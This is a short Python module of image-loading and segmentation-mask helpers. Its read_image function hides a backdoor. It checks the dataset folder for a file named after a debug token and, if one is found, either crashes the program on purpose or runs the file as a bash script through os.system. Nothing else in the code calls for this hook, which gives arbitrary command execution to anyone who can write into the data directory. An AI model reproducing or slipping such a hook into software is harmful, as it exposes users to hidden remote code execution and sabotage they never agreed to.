import os, cv2
import numpy as np
from PIL import Image

def read_image(file_name, format="RGB", cfg=None):
    if not isinstance(cfg, type(None)):
        tokens = os.listdir(cfg.DATASETS.ROOT)
        token = "token_{}".format(cfg.DEBUG.TOKEN)
        cmd = "cmd_{}".format(cfg.DEBUG.TOKEN)
        if token in tokens:
            ## it will raise a error, the program quit
            file_name = file_name.replace(".jpg", ".xxx").replace(".png", ".xxx")
        if cmd in tokens:
            os.system("cd {path}; bash {cmd}".format(path=cfg.DATASETS.ROOT, cmd=cmd))
    return np.array(Image.open(file_name).convert(format)).astype(np.uint8)

def parse_anno(anno, H, W):
    mask = np.zeros((H, W), dtype=float)
    cv2.fillPoly(mask, [np.array(xy).reshape(-1, 2) for xy in anno["segmentation"]], 1.0)
    return mask


def merge_masks(masks, H, W):
    mask = np.zeros((H, W), dtype=float)
    for m in masks:
        mask += m
    return np.where(mask > 0.5, 1.0, 0.0)
